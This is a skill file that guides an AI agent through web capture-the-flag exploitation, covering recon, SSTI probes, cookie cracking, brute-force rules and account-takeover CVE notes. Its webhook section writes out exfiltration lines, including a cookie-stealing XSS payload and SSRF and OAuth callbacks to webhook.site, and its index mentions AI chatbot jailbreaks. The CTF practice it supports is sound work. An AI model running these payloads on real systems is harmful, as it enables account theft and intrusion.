---
name: ctf-web
description: CTF web exploitation only: HTTP apps, APIs, browser clients, auth/JWT/OAuth flows, XSS/SQLi/SSTI/SSRF. Use only when the target is an HTTP service. Not for native binaries (ctf-reverse, ctf-pwn) or standalone crypto (ctf-crypto).
license: MIT
compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
allowed-tools: Bash Read Write Edit Glob Grep Task Skill
metadata:
  user-invocable: "false"
  author: Lukasz Jagiello
---

# CTF Web Exploitation

Use this skill as a routing and execution guide for web-heavy challenges. Keep the first pass short: map the app, confirm the trust boundary, and only then dive into the detailed technique notes.

## Tool Availability Policy

Before installing anything below, check whether the tool/package already exists on this machine (`which <tool>`, `command -v <tool>`, `<tool> --version`, `pip show <pkg>`, etc.) and just use it if so. Only when something required is genuinely missing, tell the user which tool/package is missing and why the task needs it, then ask them to install it (or confirm before installing it yourself) — do not install new tools silently.

## Prerequisites

**Python packages (all platforms):**
```bash
pip install flask-unsign requests httpx
```

**Linux (apt):**
```bash
apt install hashcat jq curl
```

**macOS (Homebrew):**
```bash
brew install hashcat jq curl
```

**Manual install:**
- ysoserial — [GitHub](https://github.com/frohoff/ysoserial), requires Java (Java deserialization payloads)
- PayloadsAllTheThings — git clone to ctf-web/payloads/PayloadsAllTheThings (on demand)
  ```bash
  git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git ctf-web/payloads/PayloadsAllTheThings
  ```
  > PAT is optional and on-demand — not required at load time. The skill works without it (graceful degrade): `pat-reference.md` provides an offline index with exemplar payloads; bulk wordlists require the clone above.

**MCP servers (optional):** Playwright MCP ([microsoft/playwright-mcp](https://github.com/microsoft/playwright-mcp)) for browser-dependent challenges (DOM XSS, admin bot, SPA client secrets) and Burp Suite MCP ([PortSwigger/mcp-server](https://github.com/PortSwigger/mcp-server)) for wire-level work (header-level HTTP/1.1+HTTP/2 control, smuggling, blind SSRF/XXE via Collaborator, proxy-history regex mining) — see [tools-mcp.md](tools-mcp.md). Two things to do before relying on Burp MCP: start Burp *before* the agent, and turn off the two approval gates in Burp's MCP tab or the first tool call blocks on a modal dialog.

## Additional Resources

- [sql-injection.md](sql-injection.md) - SQL injection techniques: auth bypass, UNION extraction, filter bypasses, second-order SQLi, truncation, race-assisted leaks, INSERT ON DUPLICATE KEY UPDATE password overwrite, innodb_table_stats WAF bypass
- [server-side.md](server-side.md) - PHP type juggling, php://filter LFI, Python str.format traversal, SSTI (Jinja2, Twig, ERB, Mako, EJS, Vue.js, Smarty), SSRF (Host header, DNS rebinding, curl redirect, unescaped-dot regex, SNI FTP smuggling, mod_vhost_alias), PHP hash_hmac NULL
- [server-side-2.md](server-side-2.md) - XXE (basic, OOB, DOCX upload), XML injection via X-Forwarded-For, PHP variable variables, PHP uniqid predictable filename, sequential regex replacement bypass, command injection (newline, blocklist, sendmail CGI, multi-barcode, git CLI), GraphQL injection (introspection, batching, interpolation)
- [server-side-exec.md](server-side-exec.md) - Direct code execution paths, upload-to-RCE, deserialization-adjacent execution, LaTeX injection, header and API abuses
- [server-side-exec-2.md](server-side-exec-2.md) - More execution chains: SQLi fragmentation, path parser tricks, polyglot uploads, wrapper abuse, filename injection, BMP pixel webshell with filename truncation
- [server-side-deser.md](server-side-deser.md) - Java/Python/PHP deserialization and race-condition playbooks, PHP SoapClient CRLF SSRF via deserialization
- [server-side-advanced.md](server-side-advanced.md) - Advanced SSRF, traversal, archive, parser, framework, and modern app-server issues, Nginx alias traversal
- [server-side-advanced-2.md](server-side-advanced-2.md) - Docker API SSRF, Castor/XML, Apache expression reads, parser discrepancies, Windows path tricks, rogue MySQL server file read
- [server-side-advanced-3.md](server-side-advanced-3.md) - Part 3 (CSAW/35C3/ASIS/PlaidCTF 2018): WAV polyglot upload, multi-slash URL `path.startswith` bypass, Xalan XSLT `math:random()` seed guess, SoapClient `_user_agent` CRLF method smuggling, `gopher:///` no-host URL scheme bypass, SSRF credential leak via attacker-specified outbound URL
- [server-side-advanced-4.md](server-side-advanced-4.md) - Part 4: WeasyPrint SSRF/file read (CVE-2024-28184), MongoDB regex/$where blind oracle, Pongo2 Go template injection, ZIP PHP webshell, basename() bypass, wget CRLF SSRF→SMTP, Gopher SSRF to MySQL blind SQLi, React Server Components Flight RCE (CVE-2025-55182), AMQP/TLS interception via sslsplit+arpspoof, CairoSVG XXE, Bazaar repo reconstruction
- [client-side.md](client-side.md) - XSS, CSRF, cache poisoning, DOM tricks, admin bot abuse, request smuggling, paywall bypass
- [client-side-advanced.md](client-side-advanced.md) - CSP bypasses, Unicode tricks, XSSI, CSS exfiltration, browser normalization quirks, postMessage null origin bypass
- [auth-and-access.md](auth-and-access.md) - Auth/authz bypasses, hidden endpoints, IDOR, redirect chains, subdomain takeover, AI chatbot jailbreaks
- [auth-and-access-2.md](auth-and-access-2.md) - Part 2 (2018-era): `std::unordered_set` bucket collision auth bypass, `nodeprep.prepare` Unicode homograph username collision, SRP A=0/A=N auth bypass, ArangoDB AQL MERGE privilege escalation
- [auth-jwt.md](auth-jwt.md) - JWT/JWE manipulation, weak secrets, header injection, key confusion, replay
- [auth-infra.md](auth-infra.md) - OAuth/OIDC, SAML, CORS, CI/CD secrets, IdP abuse, login poisoning
- [node-and-prototype.md](node-and-prototype.md) - Prototype pollution, JS sandbox escape, Node.js attack chains
- [web3.md](web3.md) - Solidity and Web3 challenge notes
- [cves.md](cves.md) - CVE-driven techniques you can match against challenge banners, headers, dependency leaks, or version strings
- [field-notes.md](field-notes.md) - Long-form exploit notes: quick references for SQLi, XSS, LFI, JWT, SSTI, SSRF, command injection, XXE, deserialization, race conditions, auth bypass, and multi-stage chains
- [tools-mcp.md](tools-mcp.md) - MCP server integration for web: Playwright MCP (admin-bot DOM XSS reproduction, live DOM/console/network inspection, `browser_network_requests` lists endpoints but only `browser_network_request part="response-body"` returns payloads) and Burp Suite official MCP (27 tools, approval gates that block the agent on a modal dialog, target triple decoupling socket from `Host:` header, `normalizeHttpContent` rewriting CR/LF in the request prelude, map-based HTTP/2 that cannot express duplicate headers, `send_to_intruder` stages only, proxy history truncating items at 5000 chars, Collaborator `payloadId`/`customData` Pro-only); when to use each vs curl and scripted requests
- [python-requests.md](python-requests.md) - Python requests toolkit: session scaffold, payload deploy from pat-reference.md wordlists, header/param spray, cookie/JWT, proxy. `scripts/async_fuzz.py` (100 concurrent) is a bulk fuzzer — fine against challenge targets, no DoS
- [pat-reference.md](pat-reference.md) — PayloadsAllTheThings index: bulk payloads for XSS/SQLi/SSRF/SSTI/LFI/Command Injection/Upload (requires PAT clone, see Prerequisites)
- [client-side-chains.md](client-side-chains.md) - Open on demand: admin-bot chains (bfcache, service workers, header-too-large, DOM clobbering, mXSS), server-side parser gaps (smuggling, response splitting, YAML, Next.js image cache), Java RMI/Hessian deserialization

## When to Pivot

- If the target is a native binary, custom VM, or firmware image, switch to `/ctf-reverse` first.
- If the HTTP bug only gives you code execution and the hard part becomes memory corruption or seccomp escape, switch to `/ctf-pwn`.
- If the "web" challenge really turns on JWT math, custom MACs, or crypto primitives, switch to `/ctf-crypto`.
- If the web challenge involves analyzing logs, PCAPs, or recovering artifacts from a web server, switch to `/ctf-forensics`.
- If the challenge requires gathering intelligence from public web sources, DNS records, or social media before exploitation, switch to `/ctf-osint`.

## Similar Writeups

Stuck? Follow the `/ctf-similar-search` skill (Tavily API) with challenge-specific identifiers — competition + challenge name (≤3 words) or unique code/error strings, never generic terms like "SSRF" or "XSS". Past/other-event writeups are fine to pull; for a challenge from the **current** event, ask the user first (project rule). Queries go to a third-party API.

## Manual-analysis default

Read the source, hand-craft single requests, hunt parser mismatches — usually faster than scanning. If you do scan or fuzz (sqlmap/ffuf/gobuster/`scripts/async_fuzz.py`), that's allowed against challenge targets — keep it bounded, no DoS, and never attack the scoreboard/platform. High-value patterns (details: [server-side.md](server-side.md), [server-side-advanced.md](server-side-advanced.md), [node-and-prototype.md](node-and-prototype.md)):

- Node `fs.readFileSync(user)` + WAF: Express `file[a]=` builds an object; Node duck-types URLs (`.href` + `.origin`) — `?file[protocol]=file:&file[hostname]=&file[pathname]=fla%2567.txt`; double-encode banned substrings (`%2567` → `g`).
- `qs`/Express `parameterLimit=1000`: if a proxy appends `&proxy=nginx`, send ≥1000 params so the append is dropped.
- Cross-language HPP: Flask `request.form.get` takes the **first** value, PHP `$_POST` the **last** — send `tier=allowed&tier=gold` when middleware forwards the raw body.
- PHP filter prefix gate: generate a `php://filter` chain that *prepends* the required bytes (e.g. `FREE`), then read the gated resource.
- Signed exchange (SXG) in play: cache poisoning / authenticity confusion between the signed and fetched origin.
- "Hidden"/other-user note to recover: XS-Leak oracles — frame counting, error events, cache timing.

## First-Pass Workflow

1. Identify the real boundary: browser only, backend only, mixed app, or auth flow.
2. Capture one normal request/response pair for every major feature before deeper probing.
3. Enumerate hidden functionality from JS bundles, response headers, routes, and alternate methods.
4. Classify the likely bug family: injection, authz, parser mismatch, upload, trust proxy, state machine, or client-side execution.
5. Build the smallest proof first: leak, bypass, or primitive. Save full exploit chaining for later.

### Bulk payloads (PayloadsAllTheThings — on-demand)

This skill works without PAT at load time (graceful degrade): `pat-reference.md` and inline exemplars are available offline; bulk payloads require a PAT clone. After mapping the trust boundary (First-Pass Workflow), check [pat-reference.md](pat-reference.md) for the PAT directory that matches your bug class, then search bulk payloads:

```bash
# PAT payload search (requires PAT clone — see Prerequisites; gracefully skipped if missing)
ls ctf-web/payloads/PayloadsAllTheThings 2>/dev/null | head
grep -R "onerror" "ctf-web/payloads/PayloadsAllTheThings/XSS Injection" 2>/dev/null | head
```

Or via agent tools (no clone required for the index itself):

```text
Glob ctf-web/payloads/PayloadsAllTheThings/**/*.md
Grep "union select" ctf-web/payloads/PayloadsAllTheThings
```

If `ctf-web/payloads/PayloadsAllTheThings/.git` is missing, the agent lazy-clones on demand:

```bash
[ -d "ctf-web/payloads/PayloadsAllTheThings/.git" ] || git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git ctf-web/payloads/PayloadsAllTheThings
```

## Quick Start Commands

```bash
# Recon (manual, low-volume)
curl -sI https://target.com
curl -s https://target.com/robots.txt

# JWT decode (no verification)
echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Cookie decode (Flask)
flask-unsign --decode --cookie '<cookie>'
flask-unsign --unsign --cookie '<cookie>' --wordlist rockyou.txt

# SSTI probes
curl "https://target.com/page?name={{7*7}}"
curl "https://target.com/page?name={{config}}"

# Request inspection
curl -v -X POST https://target.com/api -H "Content-Type: application/json" -d '{}'
```

## Login Brute-Force — Rules

**Check the event's rules first.** Brute force against challenge targets is allowed; no DoS, and never target the scoreboard/platform. Prefer bypasses (SQLi/NoSQLi, cookie/JWT forgery, default or
leaked credentials found in source) and offline cracking. If brute-forcing is appropriate, keep it bounded:

1. **Username:** use `admin` unless the challenge names a specific account.
   Hints like "weak password" describe the PASSWORD, not the username.
2. **Passwords:** read an existing wordlist (default
   `/usr/share/wordlists/metasploit/burnett_top_1024.txt`) directly instead of
   hand-writing a list. Keep it small, rate-limited, and stop at the first hit.

For complex scenarios (CSRF tokens, frontend encryption, JSON APIs, Basic Auth, threading), see the reference scripts in [auth-and-access.md](auth-and-access.md) — but those scripts must still follow the two rules above.

## First Questions to Answer

- Is the flag likely in the browser, an API response, a local file, a database row, or an internal service?
- Does the app trust user-controlled data in templates, redirects, file paths, headers, serialized objects, or background jobs?
- Are there multiple parsers disagreeing with each other: proxy vs app, URL parser vs fetcher, sanitizer vs browser, serializer vs filter?
- Can you turn the bug into a smaller primitive first: read one file, forge one token, call one internal endpoint, trigger one bot visit?

## High-Value Recon Checks

- Read the HTML, inline scripts, and bundled JS before guessing the API surface.
- Compare what the UI submits with what the backend accepts; optional JSON fields often unlock hidden paths.
- Check obvious metadata and helper paths early: `/robots.txt`, `/sitemap.xml`, `/.well-known/`, `/admin`, `/debug`, `/.git/`, `/.env`.
- Try alternate verbs and content types on interesting routes: `GET`, `POST`, `PUT`, `PATCH`, `TRACE`, JSON, form, multipart, XML.
- Treat file upload, PDF/export, webhook, OAuth callback, and admin bot features as likely exploit multipliers.

## Fast Pattern Map

- SQL errors, odd filtering, or state-dependent DB behavior: start with [sql-injection.md](sql-injection.md).
- Templating, file reads, SSRF, command execution, XML, or parser bugs: start with [server-side.md](server-side.md) and [server-side-exec.md](server-side-exec.md).
- XSS, CSP bypass, admin bot, client routing, DOM issues, or scriptless exfiltration: start with [client-side.md](client-side.md). Admin bot + strict CSP, response splitting, or a Java endpoint → [client-side-chains.md](client-side-chains.md).
- Session forgery, hidden admin routes, JWT, OAuth, SAML, or weak trust boundaries: start with [auth-and-access.md](auth-and-access.md), [auth-jwt.md](auth-jwt.md), and [auth-infra.md](auth-infra.md).
- Node.js apps, prototype pollution, VM sandboxes, or SSRF into internal services: add [node-and-prototype.md](node-and-prototype.md).
- Smart contract frontends or blockchain-integrated apps: add [web3.md](web3.md).

## Common Chain Shapes

- Recon -> hidden route -> auth bypass -> internal file read -> token or flag
- XSS or HTML injection -> admin bot -> privileged action -> secret leak
- Traversal or upload -> config/source leak -> secret recovery -> session forgery
- SSRF -> metadata or internal API -> credential leak -> code execution
- SQLi or NoSQL injection -> credential bypass -> second-stage template or upload abuse

## Webhook Callbacks (webhook.site)

[webhook.site](https://webhook.site) and similar callback services are third-party and fine to use per project rules. For an exploit that needs a callback URL (XSS admin bot, SSRF exfiltration, OAuth redirect abuse, blind OOB), prefer a local listener the target can reach when convenient (`python3 -m http.server`, Burp Collaborator), and avoid sending real flags or other secrets to third parties unnecessarily. Reference commands:

**Create a token (get a callback URL):**
```bash
curl -X POST https://webhook.site/token
# Returns {"uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx", ...}
# Your callback URL: https://webhook.site/<uuid>
```

**Use the callback URL in your exploit:**
```bash
# XSS payload with webhook callback
curl -X POST https://target.com/api/report \
  -H "Content-Type: application/json" \
  -d '{"url": "https://webhook.site/<uuid>/steal?cookie=" + document.cookie}'

# SSRF exfiltration via webhook (marker data only — never real flag bytes)
curl "https://target.com/ssrf?url=https://webhook.site/<uuid>/?data=<exfil-marker>"

# OAuth redirect abuse
curl "https://target.com/auth?redirect=https://webhook.site/<uuid>/token"
```

**Retrieve the last received request:**
```bash
curl "https://webhook.site/token/<uuid>/request/latest/raw" \
  -H "accept: application/json" \
  -H "api-key: <uuid>"
```

**When to use webhook.site vs Burp Collaborator vs interactsh:**
- **webhook.site** — fastest setup, browser-visible UI, no install needed; best for quick CTF callbacks
- **Burp Collaborator** — better for blind XSS/SSRF when using Burp Suite as proxy
- **interactsh** — OOB interaction correlation for complex multi-step exploits

## Deep-Dive Notes

Use [field-notes.md](field-notes.md) once you have confirmed the challenge is truly web-heavy and you need the long exploit catalog.

- Recon, SQLi, XSS, traversal, JWT, SSTI, SSRF, XXE, and command injection quick notes
- Deserialization, race conditions, file upload to RCE, and multi-stage chain examples
- Node, OAuth/SAML, CI/CD, Web3, bot abuse, CSP bypasses, and modern browser tricks
- CVE-shaped playbooks and older challenge patterns that still show up in modern CTFs

## Common Flag Locations

- Files: `/flag.txt`, `/flag`, `/app/flag.txt`, `/home/*/flag*`
- Environment: `/proc/self/environ`, process command line, debug config dumps
- Database: tables named `flag`, `flags`, `secret`, or seeded challenge content
- HTTP: custom headers, archived responses, hidden routes, admin exports
- Browser: hidden DOM nodes, `data-*` attributes, inline state objects, source maps

## 2026 refresh — techniques from the Lancang-Mekong retro

retired_cto used **better-auth** (the "Teamline" chat SPA). That library had a cluster of 2026
account-takeover CVEs worth checking on sight whenever you see it (`/api/auth/sign-in/username`,
better-auth cookies, the username→`user:host` rewrite we observed):
- **Pre-account-hijacking (magic-link / email-OTP):** register the victim's email + your own
  password *before* they verify; you keep password access after they start using the account.
  Fixed 1.6.22 / 1.7.0-beta.10.
- **OAuth auto-link to unverified email — CVE-2026-53516** (CVSS 8.3, fixed 1.6.11): the OAuth
  callback links a provider identity to an existing local account using the *provider's* verified
  flag without checking the *local* account's verification. Pre-register the target's email, then
  link your OAuth identity onto it.
- **Magic-link sign-up marks email verified — CVE-2026-114607** (fixed 1.7.7).
- **Org-invitation takeover via unverified email — CVE-2026-53514** (7.7).

Takeaway for a "take over person X's account" challenge (exactly retired_cto's shape): the
intended path is almost certainly one of these **pre-registration / account-linking** bugs, not
the SecurityBot phishing dead-end. General class: *pre-account-hijacking* — claim an identity
before the legitimate user verifies it, then inherit their account on first login.
Refs: https://corgea.com/advisories/vulnerabilities/CVE-2026-53516 ·
https://advisories.gitlab.com/pkg/npm/better-auth/
